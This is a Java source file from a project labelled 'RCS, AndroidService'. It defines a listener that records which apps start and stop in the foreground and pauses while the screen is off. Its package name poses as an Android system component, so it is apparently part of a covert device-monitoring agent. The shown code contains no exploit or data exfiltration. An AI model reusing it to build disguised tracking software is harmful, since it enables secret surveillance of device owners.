/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : ListenerProcess.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.deviceinfo.listener;

import java.util.ArrayList;
import java.util.TreeMap;

import android.app.ActivityManager.RunningAppProcessInfo;

import com.android.deviceinfo.ProcessInfo;
import com.android.deviceinfo.ProcessStatus;
import com.android.deviceinfo.RunningProcesses;
import com.android.deviceinfo.Standby;
import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.interfaces.Observer;
import com.android.deviceinfo.util.Check;

public class ListenerProcess extends Listener<ProcessInfo> implements Observer<Standby> {
	/** The Constant TAG. */
	private static final String TAG = "ListenerProcess"; //$NON-NLS-1$

	private BroadcastMonitorProcess processReceiver;
	TreeMap<String, RunningAppProcessInfo> lastRunning = new TreeMap<String, RunningAppProcessInfo>();
	TreeMap<String, RunningAppProcessInfo> currentRunning = new TreeMap<String, RunningAppProcessInfo>();

	private boolean started;

	private Object standbyLock = new Object();
	private Object startedLock = new Object();

	/** The singleton. */
	private volatile static ListenerProcess singleton;

	/**
	 * Self.
	 * 
	 * @return the status
	 */
	public static ListenerProcess self() {
		if (singleton == null) {
			synchronized (ListenerProcess.class) {
				if (singleton == null) {
					singleton = new ListenerProcess();
				}
			}
		}
		
		return singleton;
	}

	public ListenerProcess() {
		super();
		
		synchronized (standbyLock) {
			ListenerStandby.self().attach(this);
			setSuspended(!ListenerStandby.isScreenOn());
		}
	}

	@Override
	protected void start() {

		synchronized (startedLock) {
			if (!started) {
				if (ListenerStandby.isScreenOn()) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (start)");
					}
					
					started = true;

					processReceiver = new BroadcastMonitorProcess();
					processReceiver.start();
					processReceiver.register(this);
				}else{
					if (Cfg.DEBUG) {
						Check.log(TAG + " (start): screen off");
						setSuspended(true);
					}
				}
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (start): already started");
				}
			}
		}

	}

	@Override
	protected void stop() {
		synchronized (startedLock) {
			if (started) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (stop)");
				}
				
				started = false;
				
				if (processReceiver != null) {
					processReceiver.unregister();
					processReceiver = null;
				}
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (stop): already stopped");
				}
			}
		}

	}

	protected int dispatch(RunningProcesses processes) {
		final ArrayList<RunningAppProcessInfo> list = processes.getProcessList();
		
		if (list == null) {
			return 0;
		}
		
		currentRunning.clear();

		for (final Object element : list) {
			final RunningAppProcessInfo running = (RunningAppProcessInfo) element;
			
			if (running.importance == RunningAppProcessInfo.IMPORTANCE_FOREGROUND) {

				currentRunning.put(running.processName, running);
				
				if (!lastRunning.containsKey(running.processName)) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (notification): started " + running.processName);//$NON-NLS-1$
					}
					
					dispatch(new ProcessInfo(running, ProcessStatus.START));
				} else {
					lastRunning.remove(running.processName);
				}
			}
		}

		for (final Object element : lastRunning.keySet()) {
			final RunningAppProcessInfo norun = lastRunning.get(element);
			
			if (Cfg.DEBUG) {
				Check.log(TAG + " (notification): stopped " + norun.processName);//$NON-NLS-1$
			}
			
			super.dispatch(new ProcessInfo(norun, ProcessStatus.STOP));

		}

		lastRunning = (TreeMap<String, RunningAppProcessInfo>) currentRunning.clone();

		return 0;
	}

	@Override
	public int notification(Standby b) {
		synchronized (standbyLock) {
			if (b.getStatus()) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (notification): try to resume");
				}
				
				resume();
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (notification): try to suspend");
				}
				
				suspend();
			}
		}

		return 0;
	}
}
